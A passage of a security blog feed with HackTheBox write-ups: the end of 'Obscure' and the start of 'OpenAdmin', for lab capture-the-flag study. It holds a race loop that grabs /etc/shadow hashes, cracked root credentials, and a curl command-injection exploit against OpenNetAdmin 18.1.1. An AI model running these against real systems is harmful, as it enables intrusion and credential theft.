&lt;span class="code-line"&gt;    &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;realPass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;passwords&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;realPass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;break&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Invalid user&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/SSH/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$6$&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;realPass&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;realPass&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;crypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;passW&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;salt&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;hash&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;realPass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Authed!&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;authenticated&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Incorrect pass&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/SSH/&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/tmp/SSH/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;Exception&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;traceback&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;print_exc&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;authenticated&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;@Obscure$ &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cmd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;sudo&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;-u&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;extend&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;proc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PIPE&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stderr&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;subprocess&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;PIPE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;proc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;communicate&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Output: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;o&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Error: &amp;#39;&lt;/span&gt;  &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ascii&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We reproduce the step locally. The script is copying the password hashes from
&lt;code&gt;/etc/shadow&lt;/code&gt; into a random temporary file in &lt;code&gt;/tmp/SSH/&lt;/code&gt; then it does "things"
with the file but we don't care. We just need to get the content of the file at
its creation. We run a infinite loop display the content of every file in the
folder and then exit on a success. At the same time we run the &lt;code&gt;BetterSSH.py&lt;/code&gt;
script with the &lt;code&gt;sudo&lt;/code&gt; permission. This allow us to get the &lt;code&gt;root&lt;/code&gt; password
hash.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py&lt;/span&gt;
&lt;span class="code-line"&gt;Enter username: root&lt;/span&gt;
&lt;span class="code-line"&gt;Enter password: lol&lt;/span&gt;
&lt;span class="code-line"&gt;Incorrect pass&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;robert@obscure:/tmp/SSH$ while true; do cat ./* 2&amp;gt;/dev/null&amp;amp;&amp;amp;exit; done&lt;/span&gt;
&lt;span class="code-line"&gt;root&lt;/span&gt;
&lt;span class="code-line"&gt;$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1&lt;/span&gt;
&lt;span class="code-line"&gt;18226&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;99999&lt;/span&gt;
&lt;span class="code-line"&gt;7&lt;/span&gt;
&lt;span class="code-line"&gt;robert&lt;/span&gt;
&lt;span class="code-line"&gt;$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/&lt;/span&gt;
&lt;span class="code-line"&gt;18163&lt;/span&gt;
&lt;span class="code-line"&gt;0&lt;/span&gt;
&lt;span class="code-line"&gt;99999&lt;/span&gt;
&lt;span class="code-line"&gt;7&lt;/span&gt;
&lt;span class="code-line"&gt;logout&lt;/span&gt;
&lt;span class="code-line"&gt;Connection to 10.10.10.168 closed.&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We load the hash in &lt;code&gt;john&lt;/code&gt; with the rockyou dictionary and crack the root password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hash -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;mercedes&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then with our SSH account as robert we just &lt;code&gt;su&lt;/code&gt; and use the root password to
get the root flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;robert@obscure:~/BetterSSH$ su&lt;/span&gt;
&lt;span class="code-line"&gt;Password:&lt;/span&gt;
&lt;span class="code-line"&gt;root@obscure:/home/robert/BetterSSH# cat /root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;512fd4429f33a113a44d5acde23609e3&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box is a lot of python. And this is quit straight forward once you get the
&lt;code&gt;SuperSecureServer.py&lt;/code&gt; file.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Crypto"></category><category term="Linux"></category></entry><entry><title>HTB: OpenAdmin</title><link href="https://maggick.fr/2020/05/htb-openadmin.html" rel="alternate"></link><published>2020-05-04T14:09:00+02:00</published><updated>2020-05-04T14:09:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-05-04:/2020/05/htb-openadmin.html</id><summary type="html">&lt;p&gt;&lt;img alt="OpenAdmin card" class="align-left" src="/media/2020.05/openadmin_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
January 4, 2020.
This box is classified as an easy machine. The user part is longer than the root
part and involve to find a vulnerable component, exploit it to get a shell,
found the creds of an user able to connect using SSH then found another
webservice to get the private SSH key of a second user.
The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.05/openadmin_card.png" alt="OpenAdmin card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/222"&gt;OpenAdmin&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/82600"&gt;dmw0ng&lt;/a&gt; and publish on
January 4, 2020.
This box is classified as an easy machine. The user part is longer than the root
part and involve to find a vulnerable component, exploit it to get a shell,
found the creds of an user able to connect using SSH then found another
webservice to get the private SSH key of a second user.
The root part is simply exploiting a sudo permission on &lt;code&gt;nano&lt;/code&gt; to execute command.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only the ports 22 (SSH) and 80 (HTTP) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Tue Jan  7 03:51:25 2020 as: nmap -sS -p- -oA 10.10.10.171 10.10.10.171&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.171&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.27s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT   STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp open  http&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Tue Jan  7 04:23:21 2020 -- 1 IP address (1 host up) scanned in 1915.49 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The landing page is the default Apache page.&lt;/p&gt;
&lt;p&gt;&lt;img alt="apache default page" src="/media/2020.05/openadmin_1.png"&gt;&lt;/p&gt;
&lt;p&gt;We run a dirb against it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;dirb http://10.10.10.171&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Tue Jan  7 04:29:49 2020&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://10.10.10.171/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://10.10.10.171/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/artwork/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.171/index.html (CODE:200|SIZE:10918)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://10.10.10.171/music/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://10.10.10.171/server-status (CODE:403|SIZE:277)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The artwork directory is a rabbit hole (there is no dynamic code even for the
contact page) but it was found first by dirb.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Artwork page" src="/media/2020.05/openadmin_2.png"&gt;&lt;/p&gt;
&lt;p&gt;The music directory offer a login page which redirect us to the ona webpage.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_3.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="Music page" src="/media/2020.05/openadmin_4.png"&gt;&lt;/p&gt;
&lt;h2 id="openadmin"&gt;OpenAdmin&lt;/h2&gt;
&lt;p&gt;We can see on the ona (opennetadmin) that the version is the 18.1.1 which is not
the latest. Using searchsploit we found a exploit for this specific version.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;searchsploit opennetadmin&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt; Exploit Title          |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;                        | (/usr/share/exploitdb/)&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------ ----------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;OpenNetAdmin 13.03.01 - | exploits/php/webapps/26682.txt&lt;/span&gt;
&lt;span class="code-line"&gt;OpenNetAdmin 18.1.1 - R | exploits/php/webapps/47691.sh&lt;/span&gt;
&lt;span class="code-line"&gt;------------------------ ------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The script was not working out of the box for me so I "rewrote" it (it is a
oneliner in bash).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;curl --silent -d &lt;span class="s2"&gt;&amp;quot;xajax=window_submit&amp;amp;xajaxr=1574117726710&amp;amp;xajaxargs[]=tooltips&amp;amp;xajaxargs[]=ip%3D%3E;echo \&amp;quot;BEGIN\&amp;quot;;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CMD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;;echo \&amp;quot;END\&amp;quot;&amp;amp;xajaxargs[]=ping&amp;quot;&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;http://10.10.10.171/ona/&amp;quot;&lt;/span&gt;  &lt;span class="p"&gt;|&lt;/span&gt; sed -n -e &lt;span class="s1"&gt;&amp;#39;/BEGIN/,/END/ p&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We start enumerating the box as &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sh ona_rce.sh &amp;#39;whoami&amp;#39; &lt;/span&gt;
&lt;span class="code-line"&gt;                  &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
&lt;span class="code-line"&gt;  www-data&lt;/span&gt;
&lt;span class="code-line"&gt;  END&lt;/span&gt;
&lt;span class="code-line"&gt;sh ona_rce.sh &amp;#39;ls -al&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;                &amp;lt;pre style=&amp;quot;padding: 4px;font-family: monospace;&amp;quot;&amp;gt;BEGIN&lt;/span&gt;
&lt;span class="code-line"&gt;total 72&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x 10 www-data www-data 4096 Jan  7 14:41 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-x---  7 www-data www-data 4096 Nov 21 18:23 ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php&lt;/span&gt;
